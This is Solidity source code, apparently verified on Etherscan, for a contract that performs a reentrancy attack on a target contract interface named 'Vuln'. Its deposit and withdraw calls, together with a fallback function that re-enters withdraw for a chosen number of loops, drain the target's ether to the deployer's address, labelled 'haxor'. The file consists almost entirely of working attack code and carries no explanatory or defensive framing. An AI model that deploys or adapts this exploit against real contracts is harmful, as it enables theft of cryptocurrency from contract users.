/**
 *Submitted for verification at Etherscan.io on 2021-12-06
*/

pragma solidity ^0.6.0;

contract trolololol {
    address payable public haxor;
    Vuln v;
    uint256 count;
    uint256 maxCount;

    constructor(address _address) public {
        haxor = msg.sender;
        v = Vuln(_address);
        count = 0;
        maxCount = 0;
    }

    function deposit(uint256 numLoops) public payable {
        maxCount = numLoops;
        v.deposit{value:address(this).balance}();
    }

    function freeMoney() public {
        v.withdraw();
    }

    fallback () external payable {
        if (count < maxCount) {
            count++;
            freeMoney();
        }
        else {
            haxor.transfer(address(this).balance);
            count = 0;
            maxCount = 0;
        }
    }
}

contract Vuln {
    mapping(address => uint256) public balances;
    function deposit() public payable {}
    function withdraw() public {}
}